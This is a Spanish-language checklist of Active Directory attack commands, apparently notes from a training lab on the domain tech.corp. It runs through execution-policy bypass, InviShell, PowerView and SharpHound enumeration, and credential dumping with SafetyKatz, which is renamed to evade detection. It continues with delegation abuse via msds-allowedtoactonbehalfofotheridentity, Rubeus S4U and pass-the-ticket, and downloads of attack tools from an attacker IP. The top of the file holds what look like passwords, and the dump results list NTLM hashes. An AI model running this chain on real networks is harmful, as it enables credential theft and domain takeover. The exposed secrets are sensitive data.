
Su@7696671265146737
### Quien soy
- [ ] `whoami`
- [ ] `whoami /all`
P@ssS3cretforuservirtualmachineAdm!nthatitisnotguessable!
### Cargar PowerView
- [ ] `. .\PowerView.ps1`
- [ ] `Import-Module PowerView.ps1`
- [ ] `powershell -ExecutionPolicy Bypass -Command ". .\PowerView.ps1"`

### Enumerar recursos compartidos
- [ ] `Invoke-ShareFinder`

### Leer recurso compartido
- [ ] `dir \\tech-dc.tech.corp\maintance`
- [ ] `copy \\tech-dc.tech.corp\maintance\* .`

### CMD como Admin Local
- [ ] `runas.exe /user:studentadmin cmd`
- [ ] `whoami`
- [ ] `hostname`

### Añadir usuario al grupo Administrators
- [ ] `net localgroup Administrators TECH\studentuser /add`
- [ ] `net localgroup Administrators`

### Desactivar Firewall y protección en tiempo real
### Eliminar restricciones de ejecución (Opcional)
- [ ] `Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force`
- [ ] `Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force`
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
 .\PsExec.exe -s cmd
### Cargar InviShell
- [ ] `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`

### BloodHound Enumeración
- [ ] .\SharpHound.exe -c All,GPOLocalGroup,LoggedOn --domain tech.corp

### Enumeracion AD
- [ ] `Get-DomainUser | select -ExpandProperty samaccountname`
- [ ] `Get-DomainComputer | select -ExpandProperty dnshostname`
- [ ] `Get-DomainGroup -Identity "Domain Admins"`
- [ ] `Get-DomainGroupMember -Identity "Domain Admins"`
- [ ] `Get-DomainGPO -ComputerIdentity tech-dc`

### Obtener credenciales
- [ ] `SafetyKatz.exe "privilege::debug" "token::elevate" "sekurlsa::evasive-logonPasswords" "exit"`
![[Pasted image 20260727164436.png]]

studvm$  -> 95dad9bc92763efe74968c2fcccc3b61 
studentuser -> 686079be7b2a8fae60d502ddc416b2e0 
studentadmin -> 97daeac345542c952eea4446471ca158 



### MGMTSRV GenericWrite
- [ ] Nueva Shell con *InviShell* y *PowerView*
- [ ] `$sid = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"`
- [ ] `$SD = New-Object byte[] ($sid.BinaryLength)`
- [ ] `$sid.GetBinaryForm($SD, 0)`
- [ ] `Set-DomainObject -Identity mgmtsrv -Set @{'msds-allowedtoactonbehalfofotheridentity' = $SD}`
- [ ] `Get-DomainObject -Identity mgmtsrv -Properties 'msds-allowedtoactonbehalfofotheridentity'`
### Obtener hash 
- [ ] `Rubeus.exe s4u /user:studvm$ /rc4:<hash_studvm$> /impersonateuser:techadmin /msdsspn:cifs/mgmtsrv.tech.corp /domain:tech.corp /ptt`

### Acceder a la maquina con el hash cargado en memoria
- [ ] `Invoke-Command -ComputerName mgmtsrv.tech.corp -ScriptBlock { hostname; whoami }`
- [ ] `Enter-PSSession -ComputerName mgmtsrv.tech.corp -Authentication Kerberos`

### Obtener hash de maquina y usuario
- [ ] `Invoke-WebRequest -Uri "http://172.16.100.10/InviShell.bat" -OutFile "InviShell.bat"`
- [ ] `Invoke-WebRequest -Uri "http://172.16.100.10/PowerView.ps1" -OutFile "PowerView.ps1"`
- [ ] Renombraremos SafetyKatz a Safety
- [ ] `Invoke-WebRequest -Uri "http://172.16.100.10/Safety.exe" -OutFile "Safety.exe"`
- [ ] `.\Safety.exe "sekurlsa::evasive-keys" "exit"`
- [ ] Obtenedremos hash de maquina y usuario

### Añadir los hashes a la maquina de atacante CMD system32
- [ ] `.\Rubeus.exe asktgt /user:techservice /aes256:<hash> /domain:tech.corp /dc:172.16.4.5:88 /show /ptt`

![[Pasted image 20260727161736.png]]

